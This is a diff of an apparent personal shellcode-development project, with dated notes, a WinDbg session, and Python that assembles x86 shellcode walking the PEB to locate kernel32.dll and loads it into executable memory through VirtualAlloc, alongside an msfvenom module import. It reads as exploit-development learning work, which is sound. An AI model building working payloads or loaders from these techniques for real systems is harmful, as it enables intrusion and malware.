@@ -12,6 +12,37 @@ so far figured out how to
 >13jan_218p: attaching windbg is easy, i added a line to fetch the currentPID
 - noted that i needed 5 NOPs to align int 3 properly, weird
 
+>13jan_420p: turns out python arch is important, was running 64bit python3.14
+- switched to 32bit python3.7 
+- had to disable sysCallFinder, requests is set on using a new SSL lib
+
+
+>13jan_515p: works, EBX holds the kernel32.dll base addr after ret
+
+0:004> g
+(7798.4a10): Break instruction exception - code 80000003 (first chance)
+eax=043afe38 ebx=00000000 ecx=04170000 edx=04170000 esi=04170000 edi=04170000
+eip=04170000 esp=043afde4 ebp=043afdf0 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+04170000 cc              int     3
+
+0:004> pt
+eax=043afe38 ebx=76cc0000 ecx=00000000 edx=04170000 esi=0176b388 edi=0176de50
+eip=04170020 esp=043afd84 ebp=043afde4 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+04170020 c3              ret
+
+0:004> du edi
+0176de50  "KERNEL32.DLL"
+
+0:004> lm m kernel32
+Browse full module list
+start    end        module name
+76cc0000 76db0000   KERNEL32   (pdb symbols)          C:\ProgramData\Dbg\sym\wkernel32.pdb\3B90FDE089777866BB8D6D6FE2B7FB401\wkernel32.pdb
+
+
+but a crash is triggered since theres no cleanup code after ret
+
 
 
 
@@ -30,15 +61,36 @@ from colorama import Back, Fore, Style
 from modules.keystone_module import keystone_asm
 from modules.msfvenom_module import generatePayload
 from modules.nasm_module import nasm_asm
-from modules.syscallFinder_module import get_syscall_number
+# from modules.syscallFinder_module import get_syscall_number    # cant use on <python3.8
 
 
 def ret_asm() -> str:
 
-    asm = """
+    asm = f"""
+    ; This compares all modules in InitializationOrderModuleList
+    ; since kernel32.dll is always the 1st module to be initialized,
+    ; we can just return when we find the first module with a NULL
+    ; at offset 24 (12th wchar) of the module name
     START:
-        int 3       ; Remove when not debugging  
+        int3                           ; Remove when not debugging  
     
+    EMULATE_FUNC_CALL:
+        mov ebp, esp                    ; Move ESP to EBP, setup stack frame
+        sub esp, 0x60                   ; Allocate 60 bytes
+    
+    find_kernel32:
+        xor ecx, ecx                    ; Zero out ECX
+        mov esi, fs:[ecx + 0x30]        ; move PEB to ESI
+        mov esi, [esi + 0x0C]           ; move PEB_LDR_DATA to ESI
+        mov esi, [esi + 0x1C]           ; move InInitializationOrderModuleList to ESI
+
+    find_next_module:
+        mov ebx, [esi + 0x08]           ; move base addr of module to EBX
+        mov edi, [esi + 0x20]           ; move module name to EDI
+        mov esi, [esi]                  ; move pointer to [FLINK] next module to ESI
+        cmp [edi + 12*2], cx            ; find null terminator at offset 24 (12th wchar)
+        jne find_next_module            ; if not NULL, keep looking
+        ret
     """
 
     return asm
@@ -49,7 +101,8 @@ def get_shellcode():
     asm = ret_asm()
 
     shellcode = b""
-    shellcode += keystone_asm(CODE=asm, debug=True)
+    # shellcode += keystone_asm(CODE=asm, debug=True)
+    shellcode += nasm_asm(CODE=asm, debug=True)
 
     # keystone_asm returns bytes, so we can return it as a bytesarray
     shellcode = bytearray(shellcode)
@@ -70,7 +123,7 @@ def stuff_ctypes():
     # setup VirtAlloc args
     # arg1: LPVOID lpAddress -> 0x0 because we want the OS to decide
     # arg2: SIZE_T dwSize -> size of shellcode
-    # arg3: DWORD flAllocationType -> Default: 0x3000 = MEM_COMMIT | MEM_RESERVE
+    # arg3: DWORD flAllocationType -> Default: 0x3000 = MEM_COMMIT(0x1000) | MEM_RESERVE(0x2000)
     # arg4: DWORD flProtect -> Default: 0x40 = PAGE_EXECUTE_READWRITE
 
     # Ensure correct types for args to VirtualAlloc
